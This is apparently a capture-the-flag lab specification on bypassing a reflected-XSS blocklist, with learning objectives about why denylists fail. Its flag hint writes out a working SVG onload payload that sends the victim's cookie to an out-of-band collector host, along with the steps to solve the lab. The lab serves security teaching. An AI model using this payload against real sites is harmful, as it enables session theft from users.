title: Reflected XSS — Filter Bypass Ladder (blocked <script> tags)
learning_objectives: Recognise that a substring blocklist is a denylist, and that denylists fail open: they must enumerate every dangerous form and always miss some
Bypass a blocked
Defeat a single-pass (non-recursive) filter by nesting a blocked token inside a split copy so removal reconstructs it
Evade a rigid substring match (onerror=) with a semantically-equivalent variant the parser accepts (onerror<whitespace>=)
Explain why an allowlist plus contextual output encoding (autoescaping templates) is the only robust fix
flag_hint: The blocklist strips <script/</script/javascript:/onerror= once, in one pass, then reflects ?subject= raw into a <div>. Bypass it with /?subject=<svg onload="new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)"> submitted to POST /report; the admin bot fires it on load. Read the cookie via GET /oob/received, then POST /solve {"c":"<32 hex>"}.
inspired_by: The PortSwigger 'Reflected XSS with some SVG markup allowed' / blocked-tag filter-bypass lab family, abstracted for local Docker with a Playwright victim bot and an OOB collector
